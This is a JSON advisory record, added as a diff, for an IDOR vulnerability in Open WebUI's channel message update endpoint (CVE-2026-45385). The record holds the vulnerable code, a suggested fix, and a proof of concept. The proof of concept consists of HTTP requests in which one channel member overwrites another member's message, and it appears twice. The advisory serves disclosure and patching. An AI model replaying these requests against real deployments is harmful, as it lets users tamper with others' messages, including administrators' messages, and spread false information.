@@ -1,0 +1,97 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-45385",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "description": "### Summary\nAn IDOR vulnerability exists in the Channels feature of `Open WebUI`, allowing any channel member to modify messages sent by other members (including administrators) within the same channel. This vulnerability affects the latest version (`v0.8.12`) of `Open WebUI`.\n\n### Details\nIn the `update_message_by_id` function, for `group` or `dm` type channels, only the caller's membership in the channel is checked via the `is_user_channel_member` function, without verifying message ownership. This allows any channel member to modify messages sent by other members within the same channel. The problematic code is as follows [(https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355)](https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355) :\n\n```python\nif channel.type in ['group', 'dm']:\n    if not Channels.is_user_channel_member(channel.id, user.id, db=db):\n        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())\nelse:\n    if (\n        user.role != 'admin'\n        and message.user_id != user.id\n        and not channel_has_access(user.id, channel, permission='write', strict=False, db=db)\n    ):\n        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())\n\ntry:\n    message = Messages.update_message_by_id(message_id, form_data, db=db)\n```\n\nNon-group/dm types include a check for the user ID, while the `group/dm` type clearly lacks this verification.\n\n### PoC\nThe `Channels` feature is disabled by default and can be enabled first through the `admin` interface.\n<img width=\"1024\" height=\"618\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a36502e9-c6cd-41cd-a69c-8b6ac809768f\" />\n\nCreate a `group` type channel with members including users `test1` and `test2`.\n\n```\nPOST /api/v1/channels/create HTTP/1.1\nContent-Type: application/json\n\n{\n  \"name\": \"idor-test-group\",\n  \"type\": \"group\",\n  \"user_ids\": [\n    \"cfc3cb19-9e92-4bf7-8b72-1b47fe4ff62c\",\n    \"b9997496-ff80-4c30-a366-95474f85e62b\"\n  ]\n}\n```\n\nUser `test2` sends a message in the channel.\n\n```\nPOST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/post HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer <test2_token>\n\n{\"content\":\"This is test2 secret message\"}\n```\n\nUser `test1` can directly modify the message that `test2` just sent.\n\n```\nPOST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/e0824c09-5712-4400-9b7a-b08eefcf15d3/update HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer <test1_token>\n\n{\"content\":\"HACKED BY TEST1 - message tampered!\"}\n```\n<img width=\"1024\" height=\"216\" alt=\"image\" src=\"https://github.com/user-attachments/assets/77646d01-d501-4732-ac37-3ffb69f9f01f\" />\n\nMessages sent by administrators can also be modified.\n\n<img width=\"1024\" height=\"419\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b32dc5eb-f810-41d3-b358-f000d8331761\" />\n\n\n### Impact\nMalicious users can arbitrarily tamper with messages published by other users (including administrators), allowing them to disseminate false information.\n\n### Suggested Fix\nAdd a message ownership check in the `group/dm` branch of `channels.py`.",
+    "ghsa_id": "GHSA-wwhq-cx22-f7vv",
+    "html_url": "https://github.com/advisories/GHSA-wwhq-cx22-f7vv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wwhq-cx22-f7vv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45385"
+      }
+    ],
+    "published_at": "2026-05-14T20:25:40Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-wwhq-cx22-f7vv",
+      "https://github.com/open-webui/open-webui/releases/tag/v0.9.5",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-45385",
+      "https://github.com/advisories/GHSA-wwhq-cx22-f7vv"
+    ],
+    "severity": "medium",
+    "summary": "Open WebUI has an IDOR vulnerability in the update_message_by_id API endpoint",
+    "updated_at": "2026-05-15T23:54:10Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.5",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "< 0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-wwhq-cx22-f7vv",
+  "repo": {
+    "cve_id": "CVE-2026-45385",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\nAn IDOR vulnerability exists in the Channels feature of `Open WebUI`, allowing any channel member to modify messages sent by other members (including administrators) within the same channel. This vulnerability affects the latest version (`v0.8.12`) of `Open WebUI`.\r\n\r\n### Details\r\nIn the `update_message_by_id` function, for `group` or `dm` type channels, only the caller's membership in the channel is checked via the `is_user_channel_member` function, without verifying message ownership. This allows any channel member to modify messages sent by other members within the same channel. The problematic code is as follows [(https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355)](https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/channels.py#L1355) :\r\n\r\n```python\r\nif channel.type in ['group', 'dm']:\r\n    if not Channels.is_user_channel_member(channel.id, user.id, db=db):\r\n        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())\r\nelse:\r\n    if (\r\n        user.role != 'admin'\r\n        and message.user_id != user.id\r\n        and not channel_has_access(user.id, channel, permission='write', strict=False, db=db)\r\n    ):\r\n        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=ERROR_MESSAGES.DEFAULT())\r\n\r\ntry:\r\n    message = Messages.update_message_by_id(message_id, form_data, db=db)\r\n```\r\n\r\nNon-group/dm types include a check for the user ID, while the `group/dm` type clearly lacks this verification.\r\n\r\n### PoC\r\nThe `Channels` feature is disabled by default and can be enabled first through the `admin` interface.\r\n<img width=\"1024\" height=\"618\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a36502e9-c6cd-41cd-a69c-8b6ac809768f\" />\r\n\r\nCreate a `group` type channel with members including users `test1` and `test2`.\r\n\r\n```\r\nPOST /api/v1/channels/create HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\r\n  \"name\": \"idor-test-group\",\r\n  \"type\": \"group\",\r\n  \"user_ids\": [\r\n    \"cfc3cb19-9e92-4bf7-8b72-1b47fe4ff62c\",\r\n    \"b9997496-ff80-4c30-a366-95474f85e62b\"\r\n  ]\r\n}\r\n```\r\n\r\nUser `test2` sends a message in the channel.\r\n\r\n```\r\nPOST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/post HTTP/1.1\r\nContent-Type: application/json\r\nAuthorization: Bearer <test2_token>\r\n\r\n{\"content\":\"This is test2 secret message\"}\r\n```\r\n\r\nUser `test1` can directly modify the message that `test2` just sent.\r\n\r\n```\r\nPOST /api/v1/channels/9cff5240-6b22-4c85-bf74-b8dbfe471b16/messages/e0824c09-5712-4400-9b7a-b08eefcf15d3/update HTTP/1.1\r\nContent-Type: application/json\r\nAuthorization: Bearer <test1_token>\r\n\r\n{\"content\":\"HACKED BY TEST1 - message tampered!\"}\r\n```\r\n<img width=\"1024\" height=\"216\" alt=\"image\" src=\"https://github.com/user-attachments/assets/77646d01-d501-4732-ac37-3ffb69f9f01f\" />\r\n\r\nMessages sent by administrators can also be modified.\r\n\r\n<img width=\"1024\" height=\"419\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b32dc5eb-f810-41d3-b358-f000d8331761\" />\r\n\r\n\r\n### Impact\r\nMalicious users can arbitrarily tamper with messages published by other users (including administrators), allowing them to disseminate false information.\r\n\r\n### Suggested Fix\r\nAdd a message ownership check in the `group/dm` branch of `channels.py`.\r\n",
+    "ghsa_id": "GHSA-wwhq-cx22-f7vv",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-wwhq-cx22-f7vv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wwhq-cx22-f7vv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45385"
+      }
+    ],
+    "published_at": "2026-05-10T19:29:59Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "An IDOR vulnerability exists in the update_message_by_id API endpoint",
+    "updated_at": "2026-05-12T17:40:56Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.5",
+        "vulnerable_version_range": "< 0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
